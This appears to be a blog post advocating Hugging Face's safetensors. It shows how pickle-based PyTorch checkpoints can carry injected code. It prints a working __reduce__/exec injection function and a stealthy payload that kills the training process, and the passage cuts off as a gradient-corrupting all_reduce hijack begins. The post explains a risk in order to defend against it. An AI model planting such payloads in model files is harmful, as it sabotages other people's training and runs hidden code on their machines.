<!DOCTYPE html><html><head><meta charSet="utf-8"/><meta name="twitter:card" content="summary_large_image"/><meta name="twitter:site" content="@frankkklee"/><meta name="twitter:creator" content="@frankkklee"/><meta property="og:type" content="website"/><meta property="og:locale" content="en_IE"/><meta name="viewport" content="width=device-width, initial-scale=1"/><title>Why do we need Hugging Face&#x27;s SafeTensor?</title><meta name="robots" content="index,follow"/><meta name="description" content="Malicious code can be injected in your model weights and safetensors is all you need."/><meta property="og:title" content="Why do we need Hugging Face&#x27;s SafeTensor?"/><meta property="og:description" content="Malicious code can be injected in your model weights and safetensors is all you need."/><meta property="og:url" content="https://franklee.xyz/blogs/2024-10-19-safetensor"/><meta property="og:image" content="https://franklee.xyz/public_assets/blog_media/2024-10-19-safetensor/cover.png"/><meta property="og:image:alt" content="Why do we need Hugging Face&#x27;s SafeTensor?"/><meta property="og:site_name" content="Shenggui Li"/><link rel="canonical" href="https://franklee.xyz/blogs/2024-10-19-safetensor"/><meta name="next-head-count" content="17"/><meta charSet="utf-8"/><meta name="keywords" content="Shenggui Li, Li Shenggui, Shenggui, Frank Lee, FrankLeeeeee, NTU"/><meta name="theme-color" content="#000000"/><link rel="icon" href="/favicon.ico"/><link rel="manifest" href="/manifest.json"/><link rel="preload" href="/_next/static/media/630c17af355fa44e-s.p.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-next-font="size-adjust"/><link rel="preload" href="/_next/static/css/5896d3e93c441ca3.css" as="style"/><link rel="stylesheet" href="/_next/static/css/5896d3e93c441ca3.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" nomodule="" src="/_next/static/chunks/polyfills-78c92fac7aa8fdd8.js"></script><script src="/_next/static/chunks/webpack-59c5c889f52620d6.js" defer=""></script><script src="/_next/static/chunks/framework-ff7f418116f76b2d.js" defer=""></script><script src="/_next/static/chunks/main-dacc7e304366e363.js" defer=""></script><script src="/_next/static/chunks/pages/_app-8a1ebdd2fac623c9.js" defer=""></script><script src="/_next/static/chunks/72-d3a1a5b5749a0dfe.js" defer=""></script><script src="/_next/static/chunks/323-c45424aa17199243.js" defer=""></script><script src="/_next/static/chunks/pages/blogs/%5Bslug%5D-e831998545c158b5.js" defer=""></script><script src="/_next/static/HNYm-8xpJDnHM7ohpU4kw/_buildManifest.js" defer=""></script><script src="/_next/static/HNYm-8xpJDnHM7ohpU4kw/_ssgManifest.js" defer=""></script></head><body><div id="__next"><main class="__className_4f7708"><nav class="bg-black shadow" data-headlessui-state=""><div class="mx-auto max-w-7xl px-2 sm:px-4 lg:px-8"><div class="flex h-16 justify-between"><div class="flex px-2 lg:px-0"><div class="flex flex-shrink-0 items-center"><img class="block h-16 w-auto md:hidden" src="/assets/logo.png" alt="Your Company"/><img class="hidden h-16 w-auto md:block" src="/assets/logo.png" alt="Your Company"/></div></div><div class="hidden items-center md:ml-6 md:space-x-8 md:flex md:flex-1  md:justify-end"><a class="inline-flex items-center px-1 pt-1 text-sm font-medium text-slate-200" href="/">Home</a><a class="inline-flex items-center border-b-2 border-transparent px-1 pt-1 text-sm font-medium text-slate-200" href="/about">About</a><a class="inline-flex items-center border-b-2 border-transparent px-1 pt-1 text-sm font-medium text-slate-200 " href="/blogs">Blogs</a><a target="_blank" rel="noopener noreferrer" class="inline-flex items-center border-b-2 border-transparent px-1 pt-1 text-sm font-medium text-slate-200 " href="/assets/cv.pdf">CV</a></div><div class="flex items-center md:hidden"><button class="inline-flex items-center justify-center rounded-md p-2 text-gray-400 hover:bg-gray-100 hover:text-gray-500 focus:outline-none focus:ring-2 focus:ring-inset focus:ring-indigo-500" id="headlessui-disclosure-button-:R6m:" type="button" aria-expanded="false" data-headlessui-state=""><span class="sr-only">Open main menu</span><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" class="block h-6 w-6"><path stroke-linecap="round" stroke-linejoin="round" d="M3.75 6.75h16.5M3.75 12h16.5m-16.5 5.25h16.5"></path></svg></button></div></div></div></nav><div class="container mx-auto py-8 px-8 md:px-16 lg:px-36"><div><article class="prose mx-auto text-slate-400"><h1 class="text-4xl text-white font-bold">Why do we need Hugging Face&#x27;s SafeTensor?</h1><h4 class="text-sm text-slate-400">Published on <!-- -->2024-10-19</h4><h4 class="text-sm text-slate-400">Reading time: <!-- -->5 min read</h4><h4 class="text-sm text-slate-400">Description: <!-- -->Malicious code can be injected in your model weights and safetensors is all you need.</h4><img src="https://franklee.xyz/public_assets/blog_media/2024-10-19-safetensor/cover.png" alt="blog" lazy="loa/ding"/><div class="flex items-center gap-2"><span class="text-sm text-slate-400">Share to:</span><button class="react-share__ShareButton text-slate-400" style="background-color:transparent;border:none;padding:0;font:inherit;color:inherit;cursor:pointer"><svg viewBox="0 0 64 64" width="24" height="24" class="rounded-full border border-white"><circle cx="32" cy="32" r="32" fill="#000000"></circle><path d="M 41.116 18.375 h 4.962 l -10.8405 12.39 l 12.753 16.86 H 38.005 l -7.821 -10.2255 L 21.235 47.625 H 16.27 l 11.595 -13.2525 L 15.631 18.375 H 25.87 l 7.0695 9.3465 z m -1.7415 26.28 h 2.7495 L 24.376 21.189 H 21.4255 z" fill="white"></path></svg></button><button class="react-share__ShareButton text-slate-400" style="background-color:transparent;border:none;padding:0;font:inherit;color:inherit;cursor:pointer"><svg viewBox="0 0 64 64" width="24" height="24"><circle cx="32" cy="32" r="32" fill="#0077B5"></circle><path d="M20.4,44h5.4V26.6h-5.4V44z M23.1,18c-1.7,0-3.1,1.4-3.1,3.1c0,1.7,1.4,3.1,3.1,3.1 c1.7,0,3.1-1.4,3.1-3.1C26.2,19.4,24.8,18,23.1,18z M39.5,26.2c-2.6,0-4.4,1.4-5.1,2.8h-0.1v-2.4h-5.2V44h5.4v-8.6 c0-2.3,0.4-4.5,3.2-4.5c2.8,0,2.8,2.6,2.8,4.6V44H46v-9.5C46,29.8,45,26.2,39.5,26.2z" fill="white"></path></svg></button><button class="react-share__ShareButton text-slate-400" style="background-color:transparent;border:none;padding:0;font:inherit;color:inherit;cursor:pointer"><svg viewBox="0 0 64 64" width="24" height="24"><circle cx="32" cy="32" r="32" fill="#0965FE"></circle><path d="M34.1,47V33.3h4.6l0.7-5.3h-5.3v-3.4c0-1.5,0.4-2.6,2.6-2.6l2.8,0v-4.8c-0.5-0.1-2.2-0.2-4.1-0.2 c-4.1,0-6.9,2.5-6.9,7V28H24v5.3h4.6V47H34.1z" fill="white"></path></svg></button><button class="react-share__ShareButton text-slate-400" style="background-color:transparent;border:none;padding:0;font:inherit;color:inherit;cursor:pointer"><svg viewBox="0 0 64 64" width="24" height="24"><circle cx="32" cy="32" r="32" fill="#25D366"></circle><path d="m42.32286,33.93287c-0.5178,-0.2589 -3.04726,-1.49644 -3.52105,-1.66732c-0.4712,-0.17346 -0.81554,-0.2589 -1.15987,0.2589c-0.34175,0.51004 -1.33075,1.66474 -1.63108,2.00648c-0.30032,0.33658 -0.60064,0.36247 -1.11327,0.12945c-0.5178,-0.2589 -2.17994,-0.80259 -4.14759,-2.56312c-1.53269,-1.37217 -2.56312,-3.05503 -2.86603,-3.57283c-0.30033,-0.5178 -0.03366,-0.80259 0.22524,-1.06149c0.23301,-0.23301 0.5178,-0.59547 0.7767,-0.90616c0.25372,-0.31068 0.33657,-0.5178 0.51262,-0.85437c0.17088,-0.36246 0.08544,-0.64725 -0.04402,-0.90615c-0.12945,-0.2589 -1.15987,-2.79613 -1.58964,-3.80584c-0.41424,-1.00971 -0.84142,-0.88027 -1.15987,-0.88027c-0.29773,-0.02588 -0.64208,-0.02588 -0.98382,-0.02588c-0.34693,0 -0.90616,0.12945 -1.37736,0.62136c-0.4712,0.5178 -1.80194,1.76053 -1.80194,4.27186c0,2.51134 1.84596,4.945 2.10227,5.30747c0.2589,0.33657 3.63497,5.51458 8.80262,7.74113c1.23237,0.5178 2.1903,0.82848 2.94111,1.08738c1.23237,0.38836 2.35599,0.33657 3.24402,0.20712c0.99159,-0.15534 3.04985,-1.24272 3.47963,-2.45956c0.44013,-1.21683 0.44013,-2.22654 0.31068,-2.45955c-0.12945,-0.23301 -0.46601,-0.36247 -0.98382,-0.59548m-9.40068,12.84407l-0.02589,0c-3.05503,0 -6.08417,-0.82849 -8.72495,-2.38189l-0.62136,-0.37023l-6.47252,1.68286l1.73463,-6.29129l-0.41424,-0.64725c-1.70875,-2.71846 -2.6149,-5.85116 -2.6149,-9.07706c0,-9.39809 7.68934,-17.06155 17.15993,-17.06155c4.58253,0 8.88029,1.78642 12.11655,5.02268c3.23625,3.21036 5.02267,7.50812 5.02267,12.06476c-0.0078,9.3981 -7.69712,17.06155 -17.14699,17.06155m14.58906,-31.58846c-3.93529,-3.80584 -9.1133,-5.95471 -14.62789,-5.95471c-11.36055,0 -20.60848,9.2065 -20.61625,20.52564c0,3.61684 0.94757,7.14565 2.75211,10.26282l-2.92557,10.63564l10.93337,-2.85309c3.0136,1.63108 6.4052,2.4958 9.85634,2.49839l0.01037,0c11.36574,0 20.61884,-9.2091 20.62403,-20.53082c0,-5.48093 -2.14111,-10.64081 -6.03239,-14.51915" fill="white"></path></svg></button><button class="react-share__ShareButton text-slate-400" style="background-color:transparent;border:none;padding:0;font:inherit;color:inherit;cursor:pointer"><svg viewBox="0 0 64 64" width="24" height="24"><circle cx="32" cy="32" r="32" fill="#FF5700"></circle><path d="M 53.34375 32 C 53.277344 30.160156 52.136719 28.53125 50.429688 27.839844 C 48.722656 27.148438 46.769531 27.523438 45.441406 28.800781 C 41.800781 26.324219 37.519531 24.957031 33.121094 24.863281 L 35.199219 14.878906 L 42.046875 16.320312 C 42.214844 17.882812 43.496094 19.09375 45.066406 19.171875 C 46.636719 19.253906 48.03125 18.183594 48.359375 16.644531 C 48.6875 15.105469 47.847656 13.558594 46.382812 12.992188 C 44.914062 12.425781 43.253906 13.007812 42.464844 14.367188 L 34.625 12.800781 C 34.363281 12.742188 34.09375 12.792969 33.871094 12.9375 C 33.648438 13.082031 33.492188 13.308594 33.441406 13.566406 L 31.070312 24.671875 C 26.617188 24.738281 22.277344 26.105469 18.59375 28.609375 C 17.242188 27.339844 15.273438 26.988281 13.570312 27.707031 C 11.863281 28.429688 10.746094 30.089844 10.71875 31.941406 C 10.691406 33.789062 11.757812 35.484375 13.441406 36.257812 C 13.402344 36.726562 13.402344 37.195312 13.441406 37.664062 C 13.441406 44.832031 21.792969 50.65625 32.097656 50.65625 C 42.398438 50.65625 50.753906 44.832031 50.753906 37.664062 C 50.789062 37.195312 50.789062 36.726562 50.753906 36.257812 C 52.363281 35.453125 53.371094 33.800781 53.34375 32 Z M 21.34375 35.199219 C 21.34375 33.433594 22.777344 32 24.542969 32 C 26.3125 32 27.742188 33.433594 27.742188 35.199219 C 27.742188 36.96875 26.3125 38.398438 24.542969 38.398438 C 22.777344 38.398438 21.34375 36.96875 21.34375 35.199219 Z M 39.9375 44 C 37.664062 45.710938 34.871094 46.582031 32.03125 46.464844 C 29.191406 46.582031 26.398438 45.710938 24.128906 44 C 23.847656 43.65625 23.871094 43.15625 24.183594 42.839844 C 24.5 42.527344 25 42.503906 25.34375 42.785156 C 27.269531 44.195312 29.617188 44.90625 32 44.800781 C 34.386719 44.929688 36.746094 44.242188 38.6875 42.847656 C 39.042969 42.503906 39.605469 42.511719 39.953125 42.863281 C 40.296875 43.21875 40.289062 43.785156 39.9375 44.128906 Z M 39.359375 38.527344 C 37.59375 38.527344 36.160156 37.09375 36.160156 35.328125 C 36.160156 33.5625 37.59375 32.128906 39.359375 32.128906 C 41.128906 32.128906 42.558594 33.5625 42.558594 35.328125 C 42.59375 36.203125 42.269531 37.054688 41.65625 37.6875 C 41.046875 38.316406 40.203125 38.664062 39.328125 38.65625 Z M 39.359375 38.527344" fill="white"></path></svg></button><button class="react-share__ShareButton text-slate-400" style="background-color:transparent;border:none;padding:0;font:inherit;color:inherit;cursor:pointer"><svg viewBox="0 0 64 64" width="24" height="24"><circle cx="32" cy="32" r="32" fill="#25A3E3"></circle><path d="m45.90873,15.44335c-0.6901,-0.0281 -1.37668,0.14048 -1.96142,0.41265c-0.84989,0.32661 -8.63939,3.33986 -16.5237,6.39174c-3.9685,1.53296 -7.93349,3.06593 -10.98537,4.24067c-3.05012,1.1765 -5.34694,2.05098 -5.4681,2.09312c-0.80775,0.28096 -1.89996,0.63566 -2.82712,1.72788c-0.23354,0.27218 -0.46884,0.62161 -0.58825,1.10275c-0.11941,0.48114 -0.06673,1.09222 0.16682,1.5716c0.46533,0.96052 1.25376,1.35737 2.18443,1.71383c3.09051,0.99037 6.28638,1.93508 8.93263,2.8236c0.97632,3.44171 1.91401,6.89571 2.84116,10.34268c0.30554,0.69185 0.97105,0.94823 1.65764,0.95525l-0.00351,0.03512c0,0 0.53908,0.05268 1.06412,-0.07375c0.52679,-0.12292 1.18879,-0.42846 1.79109,-0.99212c0.662,-0.62161 2.45836,-2.38812 3.47683,-3.38552l7.6736,5.66477l0.06146,0.03512c0,0 0.84989,0.59703 2.09312,0.68132c0.62161,0.04214 1.4399,-0.07726 2.14229,-0.59176c0.70766,-0.51626 1.1765,-1.34683 1.396,-2.29506c0.65673,-2.86224 5.00979,-23.57745 5.75257,-27.00686l-0.02107,0.08077c0.51977,-1.93157 0.32837,-3.70159 -0.87096,-4.74991c-0.60054,-0.52152 -1.2924,-0.7498 -1.98425,-0.77965l0,0.00176zm-0.2072,3.29069c0.04741,0.0439 0.0439,0.0439 0.00351,0.04741c-0.01229,-0.00351 0.14048,0.2072 -0.15804,1.32576l-0.01229,0.04214l-0.00878,0.03863c-0.75858,3.50668 -5.15554,24.40802 -5.74203,26.96472c-0.08077,0.34417 -0.11414,0.31959 -0.09482,0.29852c-0.1756,-0.02634 -0.50045,-0.16506 -0.52679,-0.1756l-13.13468,-9.70175c4.4988,-4.33199 9.09945,-8.25307 13.744,-12.43229c0.8218,-0.41265 0.68483,-1.68573 -0.29852,-1.70681c-1.04305,0.24584 -1.92279,0.99564 -2.8798,1.47502c-5.49971,3.2626 -11.11882,6.13186 -16.55882,9.49279c-2.792,-0.97105 -5.57873,-1.77704 -8.15298,-2.57601c2.2336,-0.89555 4.00889,-1.55579 5.75608,-2.23009c3.05188,-1.1765 7.01687,-2.7042 10.98537,-4.24067c7.94051,-3.06944 15.92667,-6.16346 16.62028,-6.43037l0.05619,-0.02283l0.05268,-0.02283c0.19316,-0.0878 0.30378,-0.09658 0.35471,-0.10009c0,0 -0.01756,-0.05795 -0.00351,-0.04566l-0.00176,0zm-20.91715,22.0638l2.16687,1.60145c-0.93418,0.91311 -1.81743,1.77353 -2.45485,2.38812l0.28798,-3.98957" fill="white"></path></svg></button></div><hr class="rounded text-slate-400"/><div class="text-justify"><p>A long time ago, a very simple question came to my mind when I was reading a bunch of Hugging Face&#x27;s documentation - what does Hugging Face&#x27;s Safetensor do? The term &quot;Safetensor&quot; appears in many places in the Hugging Face&#x27;s documentation but people rarely talk about it and discuss its purpose. Recently, there was a security affair which affected a team&#x27;s model training progress and this prompts me to revisit this question and write this blog. It should be noted that this blog is not a discussion of the affair but rather the technical advocation for the use of safetensors to protect your models, which are the most important assets in the AI era.</p>
<h2 id="whats-wrong-with-the-current-model-storage" class="text-white">What&#x27;s wrong with the current model storage?</h2>
<p>When we train a model, we often save the model weights to a file for checkpointing and later loading. The most popular format for this is the PyTorch state dictionary, which is a Python dictionary object mapping each layer to its parameter tensor. I guess most of you are familiar with the following code snippet:</p>
<pre><div style="background:hsl(220, 13%, 18%);color:hsl(220, 14%, 71%);text-shadow:0 1px rgba(0, 0, 0, 0.3);font-family:&quot;Fira Code&quot;, &quot;Fira Mono&quot;, Menlo, Consolas, &quot;DejaVu Sans Mono&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:2;-o-tab-size:2;tab-size:2;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:0.5em 0;overflow:auto;border-radius:0.3em"><code class="language-python" style="white-space:pre;background:hsl(220, 13%, 18%);color:hsl(220, 14%, 71%);text-shadow:0 1px rgba(0, 0, 0, 0.3);font-family:&quot;Fira Code&quot;, &quot;Fira Mono&quot;, Menlo, Consolas, &quot;DejaVu Sans Mono&quot;, monospace;direction:ltr;text-align:left;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:2;-o-tab-size:2;tab-size:2;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token" style="color:hsl(220, 10%, 40%);font-style:italic"># save model weights</span><span>
</span><span>state_dict </span><span class="token" style="color:hsl(207, 82%, 66%)">=</span><span> model</span><span class="token" style="color:hsl(220, 14%, 71%)">.</span><span>state_dict</span><span class="token" style="color:hsl(220, 14%, 71%)">(</span><span class="token" style="color:hsl(220, 14%, 71%)">)</span><span>
</span><span>torch</span><span class="token" style="color:hsl(220, 14%, 71%)">.</span><span>save</span><span class="token" style="color:hsl(220, 14%, 71%)">(</span><span>state_dict</span><span class="token" style="color:hsl(220, 14%, 71%)">,</span><span> </span><span class="token" style="color:hsl(95, 38%, 62%)">&quot;model.pt&quot;</span><span class="token" style="color:hsl(220, 14%, 71%)">)</span><span>
</span>
<span></span><span class="token" style="color:hsl(220, 10%, 40%);font-style:italic"># load model weights</span><span>
</span><span>state_dict </span><span class="token" style="color:hsl(207, 82%, 66%)">=</span><span> torch</span><span class="token" style="color:hsl(220, 14%, 71%)">.</span><span>load</span><span class="token" style="color:hsl(220, 14%, 71%)">(</span><span class="token" style="color:hsl(95, 38%, 62%)">&quot;model.pt&quot;</span><span class="token" style="color:hsl(220, 14%, 71%)">)</span><span>
</span><span>model</span><span class="token" style="color:hsl(220, 14%, 71%)">.</span><span>load_state_dict</span><span class="token" style="color:hsl(220, 14%, 71%)">(</span><span>state_dict</span><span class="token" style="color:hsl(220, 14%, 71%)">)</span></code></div></pre>
<p>However, this method uses <code class="text-slate-200">pickle</code> to serialize and deserialize the entire state dict object, raising concerns over its security. The reason is that <code class="text-slate-200">pickle</code> is not secure against erroneous or maliciously constructed data. It may load arbitrary code with the same privileges as the program that is deserializing the data. In this way, the attacker can inject arbitrary code into the model weights and cause serious security issues. One way to hack the models weights is to modify its <code class="text-slate-200">__reduce__</code> method to execute arbitrary code.</p>
<pre><div style="background:hsl(220, 13%, 18%);color:hsl(220, 14%, 71%);text-shadow:0 1px rgba(0, 0, 0, 0.3);font-family:&quot;Fira Code&quot;, &quot;Fira Mono&quot;, Menlo, Consolas, &quot;DejaVu Sans Mono&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:2;-o-tab-size:2;tab-size:2;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:0.5em 0;overflow:auto;border-radius:0.3em"><code class="language-python" style="white-space:pre;background:hsl(220, 13%, 18%);color:hsl(220, 14%, 71%);text-shadow:0 1px rgba(0, 0, 0, 0.3);font-family:&quot;Fira Code&quot;, &quot;Fira Mono&quot;, Menlo, Consolas, &quot;DejaVu Sans Mono&quot;, monospace;direction:ltr;text-align:left;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:2;-o-tab-size:2;tab-size:2;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token" style="color:hsl(286, 60%, 67%)">class</span><span> </span><span class="token" style="color:hsl(29, 54%, 61%)">Obj</span><span class="token" style="color:hsl(220, 14%, 71%)">:</span><span>
</span>
<span>    </span><span class="token" style="color:hsl(286, 60%, 67%)">def</span><span> </span><span class="token" style="color:hsl(207, 82%, 66%)">__reduce__</span><span class="token" style="color:hsl(220, 14%, 71%)">(</span><span>self</span><span class="token" style="color:hsl(220, 14%, 71%)">)</span><span class="token" style="color:hsl(220, 14%, 71%)">:</span><span>
</span><span>        </span><span class="token" style="color:hsl(286, 60%, 67%)">return</span><span> </span><span class="token" style="color:hsl(220, 14%, 71%)">(</span><span class="token" style="color:hsl(286, 60%, 67%)">exec</span><span class="token" style="color:hsl(220, 14%, 71%)">,</span><span> </span><span class="token" style="color:hsl(220, 14%, 71%)">(</span><span class="token" style="color:hsl(95, 38%, 62%)">&quot;print(&#x27;hello&#x27;)&quot;</span><span class="token" style="color:hsl(220, 14%, 71%)">,</span><span class="token" style="color:hsl(220, 14%, 71%)">)</span><span class="token" style="color:hsl(220, 14%, 71%)">)</span></code></div></pre>
<p>If you serialize this object and save it to a file, the code will be executed when you load the object. That is, you will see a &quot;hello&quot; statement printed when you load the object.</p>
<p>With this in mind, we can basically manipulate many parts of the program, including imported libraries and local variables. I have provided two typical senarios where your training process can be interrupted and the arithmetic correctness of the model weights can be tampered with. You can also find the example code in my <a class="text-slate-200 break-all" href="https://github.com/FrankLeeeee/Blog-Notes/tree/main/2024-10-19-safetensor">blog notes</a>.</p>
<h3 id="scenario-1-automatically-shut-down-the-training-process" class="text-white">Scenario 1: Automatically shut down the training process</h3>
<p>As we can see in the &quot;hello&quot; example above, the malicious code is written as a code string. Similarly, we can prepare the following code string to create a new thread, which kills the parent process after 5 seconds. This thread works at the background so the user won&#x27;t notice anything and <code class="text-slate-200">os.kill</code> does not return any error trace, which makes it hard to detect the malicious code.</p>
<pre><div style="background:hsl(220, 13%, 18%);color:hsl(220, 14%, 71%);text-shadow:0 1px rgba(0, 0, 0, 0.3);font-family:&quot;Fira Code&quot;, &quot;Fira Mono&quot;, Menlo, Consolas, &quot;DejaVu Sans Mono&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:2;-o-tab-size:2;tab-size:2;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:0.5em 0;overflow:auto;border-radius:0.3em"><code class="language-python" style="white-space:pre;background:hsl(220, 13%, 18%);color:hsl(220, 14%, 71%);text-shadow:0 1px rgba(0, 0, 0, 0.3);font-family:&quot;Fira Code&quot;, &quot;Fira Mono&quot;, Menlo, Consolas, &quot;DejaVu Sans Mono&quot;, monospace;direction:ltr;text-align:left;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:2;-o-tab-size:2;tab-size:2;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span>AUTO_SHUTDOWN </span><span class="token" style="color:hsl(207, 82%, 66%)">=</span><span> </span><span class="token triple-quoted-string" style="color:hsl(95, 38%, 62%)">&quot;&quot;&quot;
</span><span class="token triple-quoted-string" style="color:hsl(95, 38%, 62%)">import os
</span><span class="token triple-quoted-string" style="color:hsl(95, 38%, 62%)">import threading
</span><span class="token triple-quoted-string" style="color:hsl(95, 38%, 62%)">from functools import partial
</span><span class="token triple-quoted-string" style="color:hsl(95, 38%, 62%)">
</span><span class="token triple-quoted-string" style="color:hsl(95, 38%, 62%)"># get the process ID
</span><span class="token triple-quoted-string" style="color:hsl(95, 38%, 62%)">pid = os.getpid()
</span><span class="token triple-quoted-string" style="color:hsl(95, 38%, 62%)">
</span><span class="token triple-quoted-string" style="color:hsl(95, 38%, 62%)">def inject_code(pid: int):
</span><span class="token triple-quoted-string" style="color:hsl(95, 38%, 62%)">    import time
</span><span class="token triple-quoted-string" style="color:hsl(95, 38%, 62%)">    import os
</span><span class="token triple-quoted-string" style="color:hsl(95, 38%, 62%)">    time.sleep(5)
</span><span class="token triple-quoted-string" style="color:hsl(95, 38%, 62%)">    os.kill(pid, 9)
</span><span class="token triple-quoted-string" style="color:hsl(95, 38%, 62%)">
</span><span class="token triple-quoted-string" style="color:hsl(95, 38%, 62%)">wrapped_fn = partial(inject_code, pid)
</span><span class="token triple-quoted-string" style="color:hsl(95, 38%, 62%)">injection_thread = threading.Thread(target=wrapped_fn)
</span><span class="token triple-quoted-string" style="color:hsl(95, 38%, 62%)">injection_thread.start()
</span><span class="token triple-quoted-string" style="color:hsl(95, 38%, 62%)">&quot;&quot;&quot;</span></code></div></pre>
<p>Next, we need to inject this code into the state dict object. As a result, when we load the model weights from disk, the code will be executed and the training process will be interrupted.</p>
<pre><div style="background:hsl(220, 13%, 18%);color:hsl(220, 14%, 71%);text-shadow:0 1px rgba(0, 0, 0, 0.3);font-family:&quot;Fira Code&quot;, &quot;Fira Mono&quot;, Menlo, Consolas, &quot;DejaVu Sans Mono&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:2;-o-tab-size:2;tab-size:2;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:0.5em 0;overflow:auto;border-radius:0.3em"><code class="language-python" style="white-space:pre;background:hsl(220, 13%, 18%);color:hsl(220, 14%, 71%);text-shadow:0 1px rgba(0, 0, 0, 0.3);font-family:&quot;Fira Code&quot;, &quot;Fira Mono&quot;, Menlo, Consolas, &quot;DejaVu Sans Mono&quot;, monospace;direction:ltr;text-align:left;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:2;-o-tab-size:2;tab-size:2;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token" style="color:hsl(286, 60%, 67%)">def</span><span> </span><span class="token" style="color:hsl(207, 82%, 66%)">inject_malicious_code</span><span class="token" style="color:hsl(220, 14%, 71%)">(</span><span>obj</span><span class="token" style="color:hsl(220, 14%, 71%)">,</span><span> code_str</span><span class="token" style="color:hsl(220, 14%, 71%)">)</span><span class="token" style="color:hsl(220, 14%, 71%)">:</span><span>
</span><span>    </span><span class="token" style="color:hsl(220, 10%, 40%);font-style:italic"># bind a reduce fn to weights</span><span>
</span><span>    </span><span class="token" style="color:hsl(286, 60%, 67%)">def</span><span> </span><span class="token" style="color:hsl(207, 82%, 66%)">reduce</span><span class="token" style="color:hsl(220, 14%, 71%)">(</span><span>self</span><span class="token" style="color:hsl(220, 14%, 71%)">)</span><span class="token" style="color:hsl(220, 14%, 71%)">:</span><span>
</span><span>        </span><span class="token" style="color:hsl(286, 60%, 67%)">return</span><span> </span><span class="token" style="color:hsl(220, 14%, 71%)">(</span><span class="token" style="color:hsl(286, 60%, 67%)">exec</span><span class="token" style="color:hsl(220, 14%, 71%)">,</span><span> </span><span class="token" style="color:hsl(220, 14%, 71%)">(</span><span>code_str</span><span class="token" style="color:hsl(220, 14%, 71%)">,</span><span> </span><span class="token" style="color:hsl(220, 14%, 71%)">)</span><span class="token" style="color:hsl(220, 14%, 71%)">)</span><span>
</span>
<span>    </span><span class="token" style="color:hsl(220, 10%, 40%);font-style:italic"># bind the reduce fn to the weights&#x27;s __reduce__ method</span><span>
</span><span>    bound_reduce </span><span class="token" style="color:hsl(207, 82%, 66%)">=</span><span> </span><span class="token" style="color:hsl(95, 38%, 62%)">reduce</span><span class="token" style="color:hsl(220, 14%, 71%)">.</span><span>__get__</span><span class="token" style="color:hsl(220, 14%, 71%)">(</span><span>obj</span><span class="token" style="color:hsl(220, 14%, 71%)">,</span><span> obj</span><span class="token" style="color:hsl(220, 14%, 71%)">.</span><span>__class__</span><span class="token" style="color:hsl(220, 14%, 71%)">)</span><span>
</span><span>    </span><span class="token" style="color:hsl(95, 38%, 62%)">setattr</span><span class="token" style="color:hsl(220, 14%, 71%)">(</span><span>obj</span><span class="token" style="color:hsl(220, 14%, 71%)">,</span><span> </span><span class="token" style="color:hsl(95, 38%, 62%)">&quot;__reduce__&quot;</span><span class="token" style="color:hsl(220, 14%, 71%)">,</span><span> bound_reduce</span><span class="token" style="color:hsl(220, 14%, 71%)">)</span><span>
</span><span>    </span><span class="token" style="color:hsl(286, 60%, 67%)">return</span><span> obj
</span>
<span>state_dict </span><span class="token" style="color:hsl(207, 82%, 66%)">=</span><span> inject_malicious_code</span><span class="token" style="color:hsl(220, 14%, 71%)">(</span><span>state_dict</span><span class="token" style="color:hsl(220, 14%, 71%)">,</span><span> AUTO_SHUTDOWN</span><span class="token" style="color:hsl(220, 14%, 71%)">)</span></code></div></pre>
<h3 id="scenario-2-introduce-errors-in-collective-communication" class="text-white">Scenario 2: Introduce errors in collective communication</h3>
<p>Similarly, if we want to modify the behaviour of the collective communication operations, we can introduce errors in its computation so that the gradients will never be correct in distributed training. We can prepare the following code string to hijack the <code class="text-slate-200">all_reduce</code> function. This code string monkey patches the <code class="text-slate-200">all_reduce</code> API in the <code class="text-slate-200">torch.distributed</code> module and adds 1 to the tensor in place. As a result, the all-reduce results will be larger than the expected results.</p>
<pre><div style="background:hsl(220, 13%, 18%);color:hsl(220, 14%, 71%);text-shadow:0 1px rgba(0, 0, 0, 0.3);font-family:&quot;Fira Code&quot;, &quot;Fira Mono&quot;, Menlo, Consolas, &quot;DejaVu Sans Mono&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:2;-o-tab-size:2;tab-size:2;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:0.5em 0;overflow:auto;border-radius:0.3em"><code class="language-python" style="white-space:pre;background:hsl(220, 13%, 18%);color:hsl(220, 14%, 71%);text-shadow:0 1px rgba(0, 0, 0, 0.3);font-family:&quot;Fira Code&quot;, &quot;Fira Mono&quot;, Menlo, Consolas, &quot;DejaVu Sans Mono&quot;, monospace;direction:ltr;text-align:left;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:2;-o-tab-size:2;tab-size:2;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span>HIJACK_ALL_REDUCE </span><span class="token" style="color:hsl(207, 82%, 66%)">=</span><span> </span><span class="token triple-quoted-string" style="color:hsl(95, 38%, 